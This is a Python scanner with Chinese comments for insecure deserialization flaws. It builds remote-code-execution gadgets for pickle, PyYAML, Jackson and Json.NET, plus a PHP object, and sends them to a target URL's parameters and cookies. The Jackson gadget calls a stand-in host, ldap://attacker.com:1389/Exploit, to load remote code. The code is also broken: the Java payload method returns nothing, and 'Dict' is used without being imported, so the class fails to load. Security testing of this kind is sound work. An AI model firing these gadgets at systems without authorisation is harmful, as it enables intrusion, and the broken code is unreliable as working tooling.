"""
不安全反序列化檢測器
OWASP A08:2021 - Software and Data Integrity Failures

檢測 Python, Java, PHP, .NET 等語言的反序列化漏洞
"""

import pickle
import base64
import time
from typing import List, Optional
from dataclasses import dataclass
import requests

# OWASP 常量定義
OWASP_A08_2021 = 'A08:2021'
TYPE_FIELD = '$type'

@dataclass
class DeserializationFinding:
    """反序列化漏洞發現結果"""
    type: str
    parameter: str
    language: str
    payload_type: str
    severity: str
    owasp: str
    evidence: str
    success: bool


class DeserializationDetector:
    """不安全反序列化檢測器"""
    
    def __init__(self, timeout: int = 10):
        """
        初始化檢測器
        
        Args:
            timeout: 請求超時時間（秒）
        """
        self.timeout = timeout
    
    def generate_payloads(self, target_language: str) -> dict[str, bytes]:
        """
        生成針對不同語言的 payload
        
        Args:
            target_language: 目標語言 (python, java, php, dotnet)
            
        Returns:
            payload 字典 {payload_type: payload_bytes}
        """
        payloads = {}
        
        if target_language == "python":
            payloads['pickle'] = self._generate_python_pickle()
            payloads['yaml'] = self._generate_python_yaml()
            
        elif target_language == "java":
            payloads['java_serialized'] = self._generate_java_payload()
            payloads['jackson'] = self._generate_jackson_payload()
            
        elif target_language == "php":
            payloads['php_serialized'] = self._generate_php_payload()
            
        elif target_language == "dotnet":
            payloads['binary_formatter'] = self._generate_dotnet_payload()
            payloads['json_net'] = self._generate_jsonnet_payload()
        
        return payloads
    
    def _generate_python_pickle(self) -> bytes:
        """
        生成 Python pickle payload
        
        使用 __reduce__ 方法觸發命令執行
        """
        # 使用 os.system
        class ExploitOSSystem:
            def __reduce__(self):
                import os
                # 使用 sleep 5 來檢測（time-based）
                return (os.system, ('sleep 5',))
        
        # 返回編碼後的 payload
        return base64.b64encode(pickle.dumps(ExploitOSSystem()))
    
    def _generate_python_yaml(self) -> bytes:
        """
        生成 Python YAML payload
        
        PyYAML 的不安全反序列化
        """
        payload = """!!python/object/apply:os.system
args: ['sleep 5']
"""
        return payload.encode()
    
    def _generate_java_payload(self) -> bytes:
        """
        生成 Java 序列化 payload
        
        基於 ysoserial 項目的 gadget chains:
        - CommonsCollections1-7 (Apache Commons Collections)
        - Spring1-2 (Spring Framework)
        - Jdk7u21 (純 JRE)
        - ROME (RSS feed library)
        - JSON1 (json-lib)
        
        Note: 實際部署需要使用 ysoserial 工具生成真實 payload
        這裡使用檢測性 payload
        """
        # Java serialization 魔數
        magic_bytes = b"\xac\xed\x00\x05"
        
        # 創建一個觸發 sleep 的檢測 payload (不執行真實攻擊)
        # 實際實現應調用: java -jar ysoserial.jar CommonsCollections1 'sleep 5'
        
        # 這裡使用一個安全的檢測字符串
    
    def _generate_jackson_payload(self) -> bytes:
        """
        生成 Jackson JSON payload
        
        利用 Spring 的 JNDI 注入
        """
        payload = {
            "object": [
                "com.sun.rowset.JdbcRowSetImpl",
                {
                    "dataSourceName": "ldap://attacker.com:1389/Exploit",
                    "autoCommit": True
                }
            ]
        }
        import json
        return json.dumps(payload).encode()
    
    def _generate_php_payload(self) -> bytes:
        """
        生成 PHP 反序列化 payload
        
        利用魔術方法 __wakeup, __destruct
        """
        # PHP payload 示例（需要根據目標應用調整）
        php_payload = 'O:8:"Evil":1:{s:4:"cmd";s:7:"sleep 5";}'
        return php_payload.encode()
    
    def _generate_dotnet_payload(self) -> bytes:
        """
        生成 .NET BinaryFormatter payload
        
        Note: 需要使用 ysoserial.net 工具生成
        """
        placeholder = b"BinaryFormatter placeholder"
        return base64.b64encode(placeholder)
    
    def _generate_jsonnet_payload(self) -> bytes:
        """
        生成 Json.NET payload
        
        利用 TypeNameHandling 漏洞
        """
        payload = {
            "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
            "MethodName": "Start",
            "ObjectInstance": {
                "$type": "System.Diagnostics.Process, System"
            },
            "MethodParameters": {
                "$type": "System.Collections.ArrayList, mscorlib",
                "$values": ["cmd", "/c sleep 5"]
            }
        }
        import json
        return json.dumps(payload).encode()
    
    def test_deserialization(
        self,
        url: str,
        param: str,
        language: str,
        method: str = 'POST'
    ) -> List[DeserializationFinding]:
        """
        測試反序列化漏洞
        
        Args:
            url: 目標 URL
            param: 參數名稱
            language: 目標語言
            method: HTTP 方法
            
        Returns:
            發現的反序列化漏洞列表
        """
        findings = []
        payloads = self.generate_payloads(language)
        
        for payload_type, payload in payloads.items():
            # 測試基準時間
            baseline_time = self._measure_response_time(url, {})
            
            # 測試 payload
            start_time = time.time()
            
            try:
                if method.upper() == 'POST':
                    resp = requests.post(
                        url,
                        data={param: payload},
                        timeout=self.timeout
                    )
                else:
                    resp = requests.get(
                        url,
                        params={param: payload},
                        timeout=self.timeout
                    )
                
                response_time = time.time() - start_time
                
                # Time-based 檢測
                if response_time > baseline_time + 4.5:
                    findings.append(DeserializationFinding(
                        type=f'Insecure Deserialization ({payload_type})',
                        parameter=param,
                        language=language,
                        payload_type=payload_type,
                        severity='Critical',
                        owasp='A08:2021',
                        evidence=f'Time delay detected: {response_time:.2f}s (baseline: {baseline_time:.2f}s)',
                        success=True
                    ))
                    break  # 找到一個就夠了
                
                # 錯誤消息檢測
                if self._check_deserialization_error(resp.text, language):
                    findings.append(DeserializationFinding(
                        type=f'Insecure Deserialization ({payload_type})',
                        parameter=param,
                        language=language,
                        payload_type=payload_type,
                        severity='High',
                        owasp='A08:2021',
                        evidence='Deserialization error message detected',
                        success=False
                    ))
                    
            except requests.exceptions.Timeout:
                # 超時可能表示成功的 RCE
                findings.append(DeserializationFinding(
                    type=f'Insecure Deserialization ({payload_type}) - Possible',
                    parameter=param,
                    language=language,
                    payload_type=payload_type,
                    severity='High',
                    owasp='A08:2021',
                    evidence='Request timed out, possible RCE',
                    success=False
                ))
                
            except Exception as e:
                continue
        
        return findings
    
    def _measure_response_time(self, url: str, params: Dict) -> float:
        """測量正常請求的響應時間"""
        try:
            start = time.time()
            requests.get(url, params=params, timeout=self.timeout)
            return time.time() - start
        except:
            return 1.0  # 默認基準時間
    
    def _check_deserialization_error(self, response_text: str, language: str) -> bool:
        """
        檢查響應中是否包含反序列化錯誤
        
        Args:
            response_text: 響應文本
            language: 目標語言
            
        Returns:
            是否存在反序列化錯誤
        """
        error_indicators = {
            'python': [
                'pickle',
                'unpickle',
                '_pickle',
                'yaml.load',
                '__reduce__',
            ],
            'java': [
                'java.io.ObjectInputStream',
                'readObject',
                'java.io.InvalidClassException',
                'SerializationException',
            ],
            'php': [
                'unserialize',
                '__wakeup',
                '__destruct',
                'Serialization',
            ],
            'dotnet': [
                'BinaryFormatter',
                'Deserialize',
                'SerializationException',
                'TypeNameHandling',
            ]
        }
        
        indicators = error_indicators.get(language, [])
        text_lower = response_text.lower()
        
        # 檢查是否包含多個指標
        matches = sum(1 for indicator in indicators if indicator.lower() in text_lower)
        return matches >= 2
    
    def test_cookie_deserialization(
        self,
        url: str,
        cookie_name: str,
        language: str
    ) -> List[DeserializationFinding]:
        """
        測試 Cookie 中的反序列化漏洞
        
        Args:
            url: 目標 URL
            cookie_name: Cookie 名稱
            language: 目標語言
            
        Returns:
            發現的反序列化漏洞列表
        """
        findings = []
        payloads = self.generate_payloads(language)
        
        for payload_type, payload in payloads.items():
            baseline_time = self._measure_response_time(url, {})
            
            start_time = time.time()
            
            try:
                resp = requests.get(
                    url,
                    cookies={cookie_name: payload.decode('utf-8', errors='ignore')},
                    timeout=self.timeout
                )
                
                response_time = time.time() - start_time
                
                if response_time > baseline_time + 4.5:
                    findings.append(DeserializationFinding(
                        type=f'Insecure Deserialization in Cookie ({payload_type})',
                        parameter=cookie_name,
                        language=language,
                        payload_type=payload_type,
                        severity='Critical',
                        owasp='A08:2021',
                        evidence=f'Time delay detected: {response_time:.2f}s',
                        success=True
                    ))
                    break
                    
            except Exception as e:
                continue
        
        return findings


# 使用示例
if __name__ == "__main__":
    detector = DeserializationDetector()
    
    # 測試 Python 反序列化
    findings = detector.test_deserialization(
        url="http://example.com/api/process",
        param="data",
        language="python",
        method="POST"
    )
    
    for finding in findings:
        print(f"[{finding.severity}] {finding.type}")
        print(f"  Language: {finding.language}")
        print(f"  Parameter: {finding.parameter}")
        print(f"  Evidence: {finding.evidence}")
        print()
